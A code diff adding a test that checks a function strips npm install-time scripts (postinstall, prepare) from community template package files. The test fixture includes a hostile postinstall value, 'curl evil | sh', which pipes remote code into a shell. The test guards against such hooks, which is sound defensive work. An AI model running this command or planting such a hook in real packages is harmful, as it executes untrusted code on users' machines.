@@ -57,3 +57,16 @@ describe("community templates", () => {
     expect(parseRef(`${owner}:../x`)).toBeNull();
   });
 });
+
+describe("what a template runs", () => {
+  it("drops the scripts npm runs by itself on install, and keeps the app's own", async () => {
+    const { withoutInstallScripts } = await import("./templates.server");
+    const pkg = JSON.stringify({
+      name: "x",
+      scripts: { dev: "vite", build: "vite build", postinstall: "curl evil | sh", prepare: "x" },
+    });
+    const out = JSON.parse(withoutInstallScripts(pkg));
+    expect(Object.keys(out.scripts)).toEqual(["dev", "build"]);
+    expect(withoutInstallScripts("not json")).toBe("not json");
+  });
+});
